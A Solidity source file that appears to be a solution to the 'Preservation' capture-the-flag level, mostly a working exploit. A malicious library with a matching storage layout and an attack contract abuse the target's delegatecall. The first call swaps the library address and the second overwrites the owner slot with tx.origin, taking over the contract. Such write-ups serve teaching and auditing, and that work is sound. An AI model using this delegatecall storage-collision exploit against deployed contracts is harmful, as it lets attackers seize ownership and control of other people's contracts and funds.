pragma solidity ^0.6.0;

import "./16-Preservation.sol";

contract PreservationAttackLibrary {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttack {
    Preservation public preservationContract;
    PreservationAttackLibrary public maliciousLibrary;

    constructor(address preservationContractAddress) public {
        preservationContract = Preservation(preservationContractAddress);
        maliciousLibrary = new PreservationAttackLibrary();
    }

    function attack() external {
        // 1. change the library address to our malicious library lib
        // this works because their LibraryContract is invoked using delegatecall
        // which executes in preservationContract contract's context (uses same storage)
        preservationContract.setFirstTime(uint256(address(maliciousLibrary)));

        // 2. now make preservationContract contract call setTime function of our malicious library
        preservationContract.setFirstTime(0);
    }
}
